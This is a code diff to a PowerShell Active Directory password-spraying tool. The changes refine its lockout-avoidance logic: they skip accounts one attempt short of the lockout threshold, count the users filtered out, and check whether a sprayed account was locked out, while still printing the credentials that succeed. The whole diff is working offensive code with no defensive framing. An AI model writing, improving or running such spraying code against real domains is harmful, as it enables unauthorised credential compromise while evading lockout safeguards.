@@ -449,13 +449,14 @@ function Get-DomainUserList
     $AllUserObjects = $UserSearcher.FindAll()
     Write-Host -ForegroundColor "yellow" ("[*] There are " + $AllUserObjects.count + " total users found.")
     $UserListArray = @()
-
+    
     if ($RemovePotentialLockouts)
     {
         Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
+        $removedCount = 0
         foreach ($user in $AllUserObjects)
         {
-            # Getting bad password counts and lst bad password time for each user
+            # Getting bad password counts and last bad password time for each user
             $badcount = $user.Properties.badpwdcount
             $samaccountname = $user.Properties.samaccountname
             try
@@ -469,7 +470,7 @@ function Get-DomainUserList
             $currenttime = Get-Date
             $lastbadpwd = [DateTime]::FromFileTime($badpasswordtime)
             $timedifference = ($currenttime - $lastbadpwd).TotalMinutes
-
+    
             if ($badcount)
             {
                 [int]$userbadcount = [convert]::ToInt32($badcount, 10)
@@ -478,11 +479,16 @@ function Get-DomainUserList
                 # or if the time since the last failed login is greater than the domain
                 # observation window add user to spray list
                 if (($timedifference -gt $observation_window) -or ($attemptsuntillockout -gt 1))
-                                {
+                {
                     $UserListArray += $samaccountname
+                }
+                else
+                {
+                    $removedCount++
                 }
             }
         }
+        Write-Host -ForegroundColor "yellow" "[*] Removed $removedCount users within 1 attempt of locking out."
     }
     else
     {
@@ -544,7 +550,7 @@ function Invoke-SpraySinglePassword
     {
         # Check BadPwdCount
         $badPwdCount = (Get-ADUser -Identity $User -Properties BadPwdCount).BadPwdCount
-        if ($badPwdCount -ge $lockoutThreshold)
+        if ($badPwdCount -ge $lockoutThreshold-1)
         {
             Write-Host -ForegroundColor Red "[*] Skipping user $User due to $badPwdCount bad password attempts (threshold: $lockoutThreshold)."
             continue
@@ -563,6 +569,14 @@ function Invoke-SpraySinglePassword
             }
             Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
         }
+        
+        # Check if user is locked out
+        $userLockoutStatus = (Get-ADUser -Identity $User -Properties LockedOut).LockedOut
+        if ($userLockoutStatus -eq $true)
+        {
+            Write-Host -ForegroundColor Red "[*] User $User is locked out!"
+        }
+
         $curr_user += 1
         if (-not $Quiet)
         {
